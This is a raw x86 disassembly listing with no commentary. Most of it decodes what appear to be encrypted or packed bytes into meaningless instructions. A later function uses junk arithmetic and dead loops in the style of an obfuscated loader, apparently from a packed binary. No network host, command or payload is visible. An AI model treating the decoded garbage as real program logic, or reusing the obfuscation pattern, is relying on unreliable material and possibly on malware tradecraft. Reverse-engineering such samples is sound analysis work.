  40e026:	addr16 ja 0x40e056
  40e029:	add    ebx,ecx
  40e02b:	and    ebp,DWORD PTR [eax+ecx*1-0x37]
  40e02f:	or     eax,0xe918dae7
  40e034:	jnp    0x40dfd8
  40e036:	xor    cl,BYTE PTR [eax-0x56367255]
  40e03c:	or     eax,0x5f4dc3ee
  40e041:	test   al,0xf4
  40e043:	into   
  40e044:	pop    ecx
  40e045:	xchg   BYTE PTR [edi+0x1e],ch
  40e048:	sbb    bh,BYTE PTR [edx-0x7a]
  40e04b:	and    BYTE PTR [edi+0x5769f0ae],al
  40e051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e052:	data16 jbe 0x40e06e
  40e055:	xor    ecx,DWORD PTR [edx]
  40e057:	jne    0x40dfda
  40e059:	adc    bh,BYTE PTR [ebp+0x35]
  40e05c:	sbb    bh,BYTE PTR [esi+0x29e09e65]
  40e062:	or     edi,DWORD PTR [ebx]
  40e064:	xlat   BYTE PTR ds:[ebx]
  40e065:	cmp    ah,BYTE PTR [ebp+0x39739864]
  40e06b:	and    DWORD PTR [ecx],0xfec442e2
  40e071:	cmp    eax,ebx
  40e073:	jle    0x40e0e4
  40e075:	adc    ch,ah
  40e077:	out    dx,al
  40e078:	pop    eax
  40e079:	int    0x71
  40e07b:	mov    ah,BYTE PTR [edi]
  40e07d:	pop    ecx
  40e07e:	pop    edx
  40e07f:	inc    ecx
  40e080:	aam    0xe7
  40e082:	lock sbb BYTE PTR [edx-0x6a],dl
  40e086:	int3   
  40e087:	inc    bh
  40e089:	aas    
  40e08a:	pop    ds
  40e08b:	jg     0x40e0d8
  40e08d:	xchg   ecx,eax
  40e08e:	jge    0x40e10b
  40e090:	pushf  
  40e091:	out    dx,al
  40e092:	cmp    DWORD PTR [eax-0x6a],0xef9c172b
  40e099:	cmp    DWORD PTR [eax],ebx
  40e09b:	(bad)  
  40e09c:	fild   QWORD PTR [eax]
  40e09e:	sti    
  40e09f:	push   0xffffff89
  40e0a1:	xlat   BYTE PTR ds:[ebx]
  40e0a2:	push   edi
  40e0a3:	mov    esp,0x1ab9dd52
  40e0a8:	into   
  40e0a9:	push   ss
  40e0aa:	jmp    0x40e0ae
  40e0ac:	enter  0xedd3,0x8e
  40e0b0:	cmp    al,0xe2
  40e0b2:	test   DWORD PTR [edx+edi*4+0x6d],edx
  40e0b6:	out    dx,al
  40e0b7:	fcomp  DWORD PTR [ebp+0x17ac2272]
  40e0bd:	jle    0x40e0b3
  40e0bf:	inc    eax
  40e0c0:	and    dl,ch
  40e0c2:	sbb    bh,ch
  40e0c4:	out    0xab,eax
  40e0c6:	daa    
  40e0c7:	and    BYTE PTR ds:0xb2041d7,0x7a
  40e0ce:	leave  
  40e0cf:	inc    eax
  40e0d0:	jne    0x40e0fa
  40e0d2:	pop    eax
  40e0d3:	or     DWORD PTR [ebp+0x4150b5a9],esp
  40e0d9:	imul   eax,DWORD PTR [ecx],0xffffff99
  40e0dc:	xor    al,0xbb
  40e0de:	lods   eax,DWORD PTR ds:[esi]
  40e0df:	ja     0x40e0ad
  40e0e1:	sub    dl,bh
  40e0e3:	repnz xor DWORD PTR [eax],edx
  40e0e6:	xchg   edx,eax
  40e0e7:	sub    BYTE PTR ds:0x23d6a56d,0xdd
  40e0ee:	cmp    BYTE PTR [ecx],dh
  40e0f0:	aad    0x82
  40e0f2:	stos   BYTE PTR es:[edi],al
  40e0f3:	dec    esp
  40e0f4:	xlat   BYTE PTR ds:[ebx]
  40e0f5:	in     eax,dx
  40e0f6:	aaa    
  40e0f7:	inc    edx
  40e0f8:	jmp    0x40e0fd
  40e0fa:	cmp    cl,dh
  40e0fc:	loop   0x40e0c9
  40e0fe:	jmp    FWORD PTR [esi+0x129473b0]
  40e104:	test   eax,0x53dc3c42
  40e109:	mov    BYTE PTR ss:[eax-0x2f],cl
  40e10d:	ds xchg ebx,eax
  40e10f:	xor    BYTE PTR [edi-0x67],al
  40e112:	(bad)  
  40e113:	imul   edx,DWORD PTR [esi-0x554b5a1a],0xb59b58f6
  40e11d:	mov    ebx,es
  40e11f:	inc    esp
  40e120:	mov    al,ds:0xe3a29b2c
  40e125:	dec    esi
  40e126:	fcom   DWORD PTR [eax+0x2]
  40e129:	(bad)  
  40e12a:	sub    DWORD PTR [edi],ecx
  40e12c:	in     al,dx
  40e12d:	daa    
  40e12e:	pop    es
  40e12f:	jnp    0x40e17b
  40e131:	xchg   ecx,eax
  40e132:	sub    BYTE PTR [edx],0xb9
  40e135:	jle    0x40e103
  40e137:	mov    cl,0x73
  40e139:	mov    BYTE PTR [ebx+edi*2+0x6507bf8b],dh
  40e140:	pushf  
  40e141:	stos   DWORD PTR es:[edi],eax
  40e142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e143:	jmp    0x2126:0xf663d7af
  40e14a:	add    ch,cl
  40e14c:	cli    
  40e14d:	inc    eax
  40e14e:	mov    eax,0x621994d3
  40e153:	push   ss
  40e154:	dec    edi
  40e155:	or     ah,dh
  40e157:	inc    edx
  40e158:	jae    0x40e1c1
  40e15a:	call   0xc8a17aa0
  40e15f:	test   BYTE PTR [ebx+0x45],dh
  40e162:	push   0xc7cefe18
  40e167:	js     0x40e19a
  40e169:	sub    ebx,DWORD PTR [edx]
  40e16b:	jp     0x40e1a9
  40e16d:	(bad)  
  40e16e:	mov    eax,ds:0x7b28e90a
  40e173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e174:	jbe    0x40e12f
  40e176:	mov    dh,0x2f
  40e178:	or     eax,0xc5a49206
  40e17d:	sbb    eax,0xb3240454
  40e182:	outs   dx,DWORD PTR ds:[esi]
  40e183:	jge    0x40e111
  40e185:	mov    dh,0xcd
  40e187:	pop    esp
  40e188:	push   esp
  40e189:	pop    es
  40e18a:	stos   BYTE PTR es:[edi],al
  40e18b:	jb     0x40e145
  40e18d:	jns    0x40e1d9
  40e18f:	push   esp
  40e190:	pop    esi
  40e191:	repnz add edi,DWORD PTR [ebx+ecx*2+0x68d9febc]
  40e199:	ja     0x40e167
  40e19b:	sub    esi,DWORD PTR [edx-0x2c4ffdc5]
  40e1a1:	test   DWORD PTR [esp+esi*8+0x29aa213],ebx
  40e1a8:	dec    ebx
  40e1a9:	in     eax,dx
  40e1aa:	xor    eax,0xea1fa780
  40e1af:	loopne 0x40e1e5
  40e1b1:	dec    eax
  40e1b2:	loope  0x40e173
  40e1b4:	jmp    0xa30a:0xdba42a9d
  40e1bb:	in     al,dx
  40e1bc:	and    dl,BYTE PTR [esi+0x618a68ab]
  40e1c2:	adc    DWORD PTR [ebp+eax*8+0x7],ecx
  40e1c6:	add    eax,ebx
  40e1c8:	imul   esi,DWORD PTR [eax-0x4e],0x31c3d21d
  40e1cf:	mov    esp,0x1ece3921
  40e1d4:	jne    0x40e1e4
  40e1d6:	or     al,BYTE PTR [eax-0xf563431]
  40e1dc:	or     cl,BYTE PTR [edi]
  40e1de:	push   0x57cc1c71
  40e1e3:	push   ss
  40e1e4:	jbe    0x40e1f3
  40e1e6:	lea    eax,[ebx]
  40e1e8:	into   
  40e1e9:	ret    0xbe13
  40e1ec:	(bad)  
  40e1ed:	stc    
  40e1ee:	xchg   esi,eax
  40e1ef:	into   
  40e1f0:	sbb    ebp,edi
  40e1f2:	or     DWORD PTR [ebp+0x58d7c49c],ecx
  40e1f8:	gs sbb bh,ah
  40e1fb:	addr16 loop 0x40e224
  40e1fe:	xor    ch,BYTE PTR ds:0xa67dbcd2
  40e204:	or     eax,0x688d678d
  40e209:	into   
  40e20a:	adc    BYTE PTR [eax+0x49],dl
  40e20d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e20e:	push   eax
  40e20f:	into   
  40e210:	xor    esp,ebp
  40e212:	push   ds
  40e213:	shl    ebp,1
  40e215:	fisubr DWORD PTR [ebx+0x7c]
  40e218:	jmp    0xc2d9:0x7c884f4
  40e21f:	fwait
  40e220:	(bad)  
  40e221:	sub    eax,0x363bd9fc
  40e226:	cdq    
  40e227:	loope  0x40e1dc
  40e229:	push   0x2270abc7
  40e22e:	ficomp DWORD PTR [ebp-0x53931bc9]
  40e234:	lods   eax,DWORD PTR ds:[esi]
  40e235:	mov    ds:0x929de84f,al
  40e23a:	sbb    DWORD PTR [edx],ecx
  40e23c:	test   eax,0xa169ebe8
  40e241:	sub    BYTE PTR [edi],dl
  40e243:	fnstsw WORD PTR [esi-0x4e]
  40e246:	shl    esp,1
  40e248:	rol    BYTE PTR [edx],0xdf
  40e24b:	lock and BYTE PTR [edi],0x7f
  40e24f:	and    DWORD PTR ds:0xc57c1aec,edx
  40e255:	fdivr  st(6),st
  40e257:	clc    
  40e258:	bound  eax,QWORD PTR [ebx]
  40e25a:	mov    edi,0xf0b73110
  40e25f:	std    
  40e260:	stos   DWORD PTR es:[edi],eax
  40e261:	rcl    DWORD PTR [ebx+edx*4],1
  40e264:	out    dx,al
  40e265:	aas    
  40e266:	fidivr WORD PTR [ebx-0x64b8afe4]
  40e26c:	(bad)  
  40e26d:	mov    ds:0x8777d87a,eax
  40e272:	data16 int3 
  40e274:	mov    edi,0x2ba1854e
  40e279:	xlat   BYTE PTR ds:[ebx]
  40e27a:	xchg   ecx,eax
  40e27b:	push   esp
  40e27c:	test   dl,ch
  40e27e:	add    ch,ch
  40e280:	dec    edi
  40e281:	pop    ss
  40e282:	mov    cl,0x99
  40e284:	fwait
  40e285:	jbe    0x40e277
  40e287:	fwait
  40e288:	or     BYTE PTR [eax-0xd],cl
  40e28b:	add    eax,0x86805349
  40e290:	push   ss
  40e291:	dec    ecx
  40e292:	jecxz  0x40e30a
  40e294:	fidiv  DWORD PTR [ebx+0x1c]
  40e297:	sub    edi,edx
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0xd25e5ddc
  40e2c4:	ins    BYTE PTR es:[edi],dx
  40e2c5:	and    bl,BYTE PTR [ecx]
  40e2c7:	cs stos BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	cld    
  40e2d0:	retf   0xb6a1
  40e2d3:	sbb    eax,0xa03228eb
  40e2d8:	jmp    0x40e2c2
  40e2da:	das    
  40e2db:	xor    al,0x7d
  40e2dd:	add    eax,0xe9888f61
  40e2e2:	adc    eax,0xfbb4208
  40e2e7:	loop   0x40e32a
  40e2e9:	retf   
  40e2ea:	cmp    eax,0x7d413905
  40e2ef:	and    esp,DWORD PTR [edi+0x62]
  40e2f2:	inc    edi
  40e2f3:	stos   BYTE PTR es:[edi],al
  40e2f4:	dec    ecx
  40e2f5:	sub    eax,0x2dfea876
  40e2fa:	in     eax,dx
  40e2fb:	sub    bl,BYTE PTR [eax+0x41]
  40e2fe:	shl    DWORD PTR [ecx+ebp*1],0x85
  40e302:	lods   eax,DWORD PTR ds:[esi]
  40e303:	sub    al,0xad
  40e305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e306:	mov    esp,0xcb4417e8
  40e30b:	icebp  
  40e30c:	js     0x40e2ec
  40e30e:	fstp   QWORD PTR [eax-0x6f]
  40e311:	cmc    
  40e312:	mov    ds:0x676a33a1,al
  40e317:	pop    esp
  40e318:	(bad)  
  40e319:	cmp    BYTE PTR [esi],bl
  40e31b:	mov    edi,0x7e1ef667
  40e320:	sbb    DWORD PTR [esi-0xc8a4a62],ecx
  40e326:	xchg   ecx,eax
  40e327:	jo     0x40e3a3
  40e329:	xlat   BYTE PTR ds:[ebx]
  40e32a:	stos   BYTE PTR es:[edi],al
  40e32b:	stc    
  40e32c:	fild   QWORD PTR [esi+0x3c4b1272]
  40e332:	jne    0x40e339
  40e334:	mul    DWORD PTR [ebp-0x1e]
  40e337:	cdq    
  40e338:	int    0x7c
  40e33a:	out    0xf9,al
  40e33c:	mov    BYTE PTR [edi+edx*8-0x5ae4ae55],ch
  40e343:	mov    DWORD PTR fs:[eax-0x15],esp
  40e347:	fst    DWORD PTR [edi-0x76e09afd]
  40e34d:	int    0xe4
  40e34f:	cld    
  40e350:	shl    BYTE PTR [ebx+0x1cb445e8],0x4b
  40e357:	out    0x19,al
  40e359:	cmp    dl,BYTE PTR [edx]
  40e35b:	(bad)  
  40e35c:	stc    
  40e35d:	shr    bl,cl
  40e35f:	push   ecx
  40e360:	fucomip st,st(7)
  40e362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e363:	push   ebx
  40e364:	mov    ebp,0x31e48cfc
  40e369:	adc    esi,DWORD PTR [edi]
  40e36b:	iret   
  40e36c:	pop    ss
  40e36d:	xchg   DWORD PTR [edi+eax*8+0x397e1829],eax
  40e374:	sahf   
  40e375:	fisubr DWORD PTR [eax]
  40e377:	xchg   BYTE PTR [esi-0x29],cl
  40e37a:	je     0x40e33f
  40e37c:	adc    ecx,esi
  40e37e:	jle    0x40e3cb
  40e380:	lods   al,BYTE PTR ds:[esi]
  40e381:	mov    dh,0xf7
  40e383:	adc    ah,BYTE PTR [eax+0x4ffd1881]
  40e389:	fisttp WORD PTR [edi+0x77cdc379]
  40e38f:	xor    eax,0x8ffa2e6d
  40e394:	inc    esi
  40e395:	jo     0x40e381
  40e397:	jae    0x40e400
  40e399:	aad    0x7
  40e39b:	dec    eax
  40e39c:	call   0xb1120b10
  40e3a1:	imul   edi,DWORD PTR [edx-0x13],0xfffffffd
  40e3a5:	clc    
  40e3a6:	in     eax,dx
  40e3a7:	push   ss
  40e3a8:	int    0xa8
  40e3aa:	xchg   BYTE PTR [ebx+edx*1],dl
  40e3ad:	pop    ebx
  40e3ae:	int    0xb1
  40e3b0:	in     al,0x7c
  40e3b2:	jecxz  0x40e3ed
  40e3b4:	leave  
  40e3b5:	fwait
  40e3b6:	and    eax,0x2aedf58a
  40e3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3bc:	sbb    al,0x49
  40e3be:	add    ecx,DWORD PTR [eax+0x37]
  40e3c1:	sub    ebx,DWORD PTR [edx+0x6be319fc]
  40e3c7:	dec    esp
  40e3c8:	js     0x40e36e
  40e3ca:	in     al,dx
  40e3cb:	xor    ebx,esp
  40e3cd:	cmc    
  40e3ce:	mov    al,BYTE PTR ds:0xbeb4c978
  40e3d4:	pop    DWORD PTR [ebx]
  40e3d6:	cmp    ch,BYTE PTR [ebx-0x2]
  40e3d9:	mov    bl,dh
  40e3db:	pop    eax
  40e3dc:	aam    0x28
  40e3de:	outs   dx,DWORD PTR ds:[esi]
  40e3df:	fldcw  WORD PTR [esi-0x7c]
  40e3e2:	ins    DWORD PTR es:[edi],dx
  40e3e3:	or     BYTE PTR [eax+0x66],ah
  40e3e6:	jb     0x40e3de
  40e3e8:	and    DWORD PTR [eax-0x6c85dff7],edx
  40e3ee:	lods   al,BYTE PTR ds:[esi]
  40e3ef:	ret    0x866c
  40e3f2:	(bad)  
  40e3f3:	das    
  40e3f4:	aas    
  40e3f5:	test   BYTE PTR [ecx+0x5fdf179],cl
  40e3fb:	adc    eax,0x8960b77
  40e400:	xlat   BYTE PTR ds:[ebx]
  40e401:	push   ss
  40e402:	(bad)  
  40e403:	loopne 0x40e3b0
  40e405:	jle    0x40e443
  40e407:	dec    esi
  40e408:	(bad)  
  40e409:	sbb    al,dh
  40e40b:	or     eax,0x94328b35
  40e410:	shl    DWORD PTR [ecx-0x61d46a4b],0x28
  40e417:	jne    0x40e415
  40e419:	add    dh,ch
  40e41b:	retf   
  40e41c:	cmp    DWORD PTR ds:0xea850ec5,ebx
  40e422:	mov    edi,0x62d721cf
  40e427:	pop    esp
  40e428:	mov    bh,0x3d
  40e42a:	xchg   esp,eax
  40e42b:	sub    eax,0x5b4bfb33
  40e430:	(bad)  
  40e431:	ficom  WORD PTR [ecx-0x29]
  40e434:	jg     0x40e411
  40e436:	mov    ds:0xc4e77d83,eax
  40e43b:	jg     0x40e449
  40e43d:	aaa    
  40e43e:	nop
  40e43f:	mov    eax,ds:0x457d54ce
  40e444:	xor    al,0xa4
  40e446:	stc    
  40e447:	mov    ebp,0xd4c072fe
  40e44c:	(bad)
  40e450:	cmp    eax,0xb2ca724a
  40e455:	les    ecx,FWORD PTR [ebx]
  40e457:	fs jbe 0x40e4b3
  40e45a:	jecxz  0x40e4ce
  40e45c:	dec    eax
  40e45d:	cmp    ebx,DWORD PTR [edx-0x447908a9]
  40e463:	cmp    edi,DWORD PTR [edi-0x55]
  40e466:	out    0xb9,eax
  40e468:	jecxz  0x40e4e1
  40e46a:	and    BYTE PTR [ecx-0x2aaba1b9],ch
  40e470:	nop
  40e471:	jae    0x40e400
  40e473:	xchg   ecx,eax
  40e474:	out    dx,al
  40e475:	and    bh,BYTE PTR [ecx-0x32abf7f0]
  40e47b:	inc    edi
  40e47c:	(bad)  
  40e47d:	or     eax,0xd7ea8dce
  40e482:	pop    es
  40e483:	(bad)  
  40e484:	shl    BYTE PTR [ecx-0x36302853],0xd1
  40e48b:	push   ss
  40e48c:	sahf   
  40e48d:	mov    dh,0x7e
  40e48f:	mov    edi,eax
  40e491:	dec    edi
  40e492:	xchg   BYTE PTR [edi+eiz*1-0x2d],ch
  40e496:	xchg   ebp,eax
  40e497:	imul   ecx,DWORD PTR [edi],0xffffff95
  40e49a:	cmp    BYTE PTR ds:0xbc37b4cb,0xd4
  40e4a1:	jg     0x40e49d
  40e4a3:	or     BYTE PTR [ecx+0x69],dl
  40e4a6:	pop    ebp
  40e4a7:	popa   
  40e4a8:	inc    ebp
  40e4a9:	add    al,0x28
  40e4ab:	popf   
  40e4ac:	sahf   
  40e4ad:	cwde   
  40e4ae:	into   
  40e4af:	call   0x51c5bfbc
  40e4b4:	cmp    BYTE PTR [esi-0x3383d015],0xad
  40e4bb:	repz xchg al,al
  40e4be:	push   ss
  40e4bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c0:	mov    bh,0x5
  40e4c2:	xor    BYTE PTR [ebx+ecx*2-0x60ff8475],0xaf
  40e4ca:	mov    edx,DWORD PTR [esi-0xb28703e]
  40e4d0:	shl    DWORD PTR [ecx-0x80],1
  40e4d3:	test   al,0x1c
  40e4d5:	daa    
  40e4d6:	clc    
  40e4d7:	push   ecx
  40e4d8:	mov    BYTE PTR [ecx],ch
  40e4da:	push   esp
  40e4db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4dc:	lods   eax,DWORD PTR ds:[esi]
  40e4dd:	jmp    0x40e523
  40e4df:	mov    esp,0x74305409
  40e4e4:	jmp    0x40e541
  40e4e6:	push   ecx
  40e4e7:	retf   0xf830
  40e4ea:	inc    edx
  40e4eb:	daa    
  40e4ec:	in     al,0x56
  40e4ee:	dec    ecx
  40e4ef:	jl     0x40e511
  40e4f1:	jns    0x40e566
  40e4f3:	pusha  
  40e4f4:	in     eax,dx
  40e4f5:	or     BYTE PTR [eax-0x6e],dh
  40e4f8:	pop    ds
  40e4f9:	or     al,0x5c
  40e4fb:	mov    ebp,DWORD PTR [edx]
  40e4fd:	or     edi,ecx
  40e4ff:	push   esi
  40e500:	ins    BYTE PTR es:[edi],dx
  40e501:	or     al,ch
  40e503:	fwait
  40e504:	jbe    0x40e4e4
  40e506:	mov    bh,cl
  40e508:	cmp    eax,0x9909baf5
  40e50d:	jl     0x40e52d
  40e50f:	mov    al,0x79
  40e511:	jns    0x40e587
  40e513:	and    DWORD PTR [esi-0x57],edx
  40e516:	stc    
  40e517:	fdiv   QWORD PTR cs:[ecx+0x75]
  40e51b:	xchg   edi,eax
  40e51c:	jecxz  0x40e530
  40e51e:	jne    0x40e568
  40e520:	sbb    esi,ecx
  40e522:	callw  0x24b9
  40e526:	sub    al,0xf2
  40e528:	int    0x50
  40e52a:	cmp    BYTE PTR [edi+eax*1+0xd8b57d5],al
  40e531:	icebp  
  40e532:	xor    al,0x99
  40e534:	and    eax,0x63e28249
  40e539:	pop    edi
  40e53a:	dec    ecx
  40e53b:	mov    bl,BYTE PTR [edx-0x1a]
  40e53e:	jae    0x40e4e1
  40e540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e541:	(bad)  
  40e542:	es dec ebp
  40e544:	loope  0x40e54f
  40e546:	and    DWORD PTR [ebx],0x4a57df5a
  40e54c:	xchg   edi,eax
  40e54d:	mov    eax,DWORD PTR [edi+0x5d]
  40e550:	jns    0x40e580
  40e552:	ror    DWORD PTR [ebx+0x2f],1
  40e555:	mov    bl,0xd3
  40e557:	loope  0x40e5b2
  40e559:	add    BYTE PTR es:[esi-0x55],bh
  40e55d:	mov    ds:0x97aaa48b,eax
  40e562:	cs aam 0xd
  40e565:	(bad)  
  40e566:	fmul   st(3),st
  40e568:	ficom  DWORD PTR [edi]
  40e56a:	inc    edx
  40e56b:	jno    0x40e503
  40e56d:	lea    esi,[edx]
  40e56f:	lods   al,BYTE PTR ds:[esi]
  40e570:	es add eax,0x7f513c59
  40e576:	jg     0x40e5f6
  40e578:	mov    ds:0x27b27bff,al
  40e57d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e57e:	or     DWORD PTR [edx+0x31],edx
  40e581:	je     0x40e58e
  40e583:	sub    BYTE PTR [ecx-0x78],bl
  40e586:	addr16 jae 0x694cb907
  40e58d:	test   ah,dh
  40e58f:	push   ss
  40e590:	jmp    0x40e5d9
  40e592:	out    0x37,eax
  40e594:	mov    ds:0xb4905dd5,al
  40e599:	cmp    bl,ch
  40e59b:	xor    BYTE PTR [ebx],0x23
  40e59e:	les    eax,FWORD PTR [edx-0x513f8f2f]
  40e5a4:	pop    ecx
  40e5a5:	jg     0x40e551
  40e5a7:	mov    edi,0xe752de65
  40e5ac:	neg    ebx
  40e5ae:	(bad)  
  40e5af:	int    0x3a
  40e5b1:	jo     0x40e621
  40e5b3:	or     dh,BYTE PTR [edi+0x68]
  40e5b6:	test   BYTE PTR [ebx+0x13],al
  40e5b9:	fldcw  WORD PTR [ecx+0x4]
  40e5bc:	ret    
  40e5bd:	out    0x30,al
  40e5bf:	fsub   QWORD PTR [ecx-0x5b114f4f]
  40e5c5:	jmp    0x40e598
  40e5c7:	loop   0x40e5f7
  40e5c9:	arpl   sp,sp
  40e5cb:	push   edi
  40e5cc:	dec    eax
  40e5cd:	ins    DWORD PTR es:[edi],dx
  40e5ce:	(bad)  
  40e5cf:	push   ebp
  40e5d0:	popf   
  40e5d1:	addr16 and ebx,eax
  40e5d4:	fnstenv [eax+0xc]
  40e5d7:	lahf   
  40e5d8:	test   eax,0xc4505121
  40e5dd:	shl    BYTE PTR [eax],cl
  40e5df:	mov    esi,0x193a1455
  40e5e4:	stos   BYTE PTR es:[edi],al
  40e5e5:	mov    al,ds:0xc294b932
  40e5ea:	mov    bl,ch
  40e5ec:	dec    edx
  40e5ed:	scas   al,BYTE PTR es:[edi]
  40e5ee:	in     eax,0xa4
  40e5f0:	sub    BYTE PTR [ecx-0x69],bh
  40e5f3:	fwait
  40e5f4:	call   0x8e5c:0x62aca3a2
  40e5fb:	jle    0x40e5bf
  40e5fd:	cld    
  40e5fe:	clc    
  40e5ff:	push   esp
  40e600:	(bad)  
  40e601:	sti    
  40e602:	test   bh,dl
  40e604:	mov    dh,0xcd
  40e606:	arpl   WORD PTR [edx+eiz*8+0x64e910b9],bx
  40e60d:	pop    ds
  40e60e:	pop    eax
  40e60f:	shl    BYTE PTR gs:[esi],0x3d
  40e613:	cmp    ecx,DWORD PTR [ebx-0x6a]
  40e616:	repz add eax,0x5c19d5f5
  40e61c:	xor    eax,0x80b8d450
  40e621:	push   0x6c8e1763
  40e626:	repz sub BYTE PTR [ebx-0x38],cl
  40e62a:	enter  0xf713,0x56
  40e62e:	cs iret 
  40e630:	cdq    
  40e631:	add    eax,0x7c391c14
  40e636:	jg     0x40e6ad
  40e638:	popa   
  40e639:	push   edi
  40e63a:	or     BYTE PTR [ebp+0x18],bl
  40e63d:	sub    DWORD PTR [esi-0x76],esp
  40e640:	push   cs
  40e641:	push   ecx
  40e642:	mov    al,ds:0x6eb39603
  40e647:	lods   eax,DWORD PTR ds:[esi]
  40e648:	stos   DWORD PTR es:[edi],eax
  40e649:	sbb    bl,BYTE PTR [eax-0x25]
  40e64c:	leave  
  40e64d:	aas    
  40e64e:	and    cl,BYTE PTR [ecx]
  40e650:	stc    
  40e651:	(bad)  
  40e653:	aam    0x7c
  40e655:	add    eax,DWORD PTR [ebx-0x5680c40e]
  40e65b:	fild   DWORD PTR [eax]
  40e65d:	in     eax,0x7c
  40e65f:	cwde   
  40e660:	test   eax,0xd55f8d6e
  40e665:	xchg   DWORD PTR [edi],edx
  40e667:	bnd jmp 0x1a20f22b
  40e66d:	smsw   eax
  40e670:	aaa    
  40e671:	fnsave [edx+0x3e3c7bb2]
  40e677:	cmp    eax,DWORD PTR [edi]
  40e679:	dec    edx
  40e67a:	lock inc ecx
  40e67c:	add    ch,dh
  40e67e:	ficom  DWORD PTR [esi+0x1a1bb2dc]
  40e684:	jmp    0x40e6c1
  40e686:	push   es
  40e687:	aaa    
  40e688:	popa   
  40e689:	(bad)  
  40e68a:	cmp    DWORD PTR [edx],ebp
  40e68c:	loopne 0x40e656
  40e68e:	lahf   
  40e68f:	sbb    eax,0xee467b0f
  40e694:	and    DWORD PTR [edx-0x4e],ebp
  40e697:	mov    WORD PTR [ebp-0x630dbd90],?
  40e69d:	in     eax,dx
  40e69e:	inc    esi
  40e69f:	mov    ecx,0xf9a7f5a1
  40e6a4:	fcomp  DWORD PTR [eax+0x78a2413f]
  40e6aa:	mov    edi,0xe04e9bec
  40e6af:	cmp    bl,ah
  40e6b1:	pop    ss
  40e6b2:	adc    eax,0x3e9b135d
  40e6b7:	xchg   esi,eax
  40e6b8:	xlat   BYTE PTR ds:[ebx]
  40e6b9:	sbb    dh,dl
  40e6bb:	jo     0x40e6ea
  40e6bd:	aad    0x65
  40e6bf:	pushf  
  40e6c0:	pop    es
  40e6c1:	inc    ebx
  40e6c2:	nop
  40e6c3:	mov    ds:0x8baba276,al
  40e6c8:	xchg   esi,eax
  40e6c9:	pop    edi
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434613,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4345c3,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434547
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43453b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434503,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434537,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4345c7,0x4344df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4344eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43453b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4345d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4345d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4345d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4345d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4345d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4344eb
  40e789:	push   0x6202
  40e78e:	push   0x434688
  40e793:	push   0x434771
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4345d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4345d3
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4345d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43457b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43457b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43457b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43457b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43457b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43481f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43453b,0x17
  40e815:	cmp    DWORD PTR ds:0x43453b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43453b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43453b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43453b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43458b,edx
